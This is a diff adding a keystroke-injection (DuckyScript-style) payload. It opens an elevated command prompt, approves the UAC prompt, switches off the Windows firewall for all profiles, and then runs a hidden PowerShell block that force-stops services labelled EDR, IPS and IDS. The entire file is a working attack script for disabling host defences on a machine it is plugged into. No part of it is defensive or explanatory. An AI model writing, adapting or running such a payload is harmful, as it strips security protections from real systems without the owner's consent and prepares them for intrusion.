@@ -1,0 +1,37 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 500
+STRING netsh advfirewall set allprofiles state off
+ENTER
+DELAY 500
+STRING powershell -NoP -W Hidden -Command {
+    # Example: Disable EDR system
+    try {
+        Stop-Service -Name 'EDRService' -Force
+        Write-Host 'EDR system disabled successfully'
+    } catch {
+        Write-Host 'Failed to disable EDR system'
+    }
+
+    # Example: Disable IPS
+    try {
+        Stop-Service -Name 'IPS' -Force
+        Write-Host 'IPS system disabled successfully'
+    } catch {
+        Write-Host 'Failed to disable IPS system'
+    }
+
+    # Example: Close IDS system
+    try {
+        Stop-Service -Name 'IDS' -Force
+        Write-Host 'IDS system closed successfully'
+    } catch {
+        Write-Host 'Failed to close IDS system'
+    }
+}
+ENTER
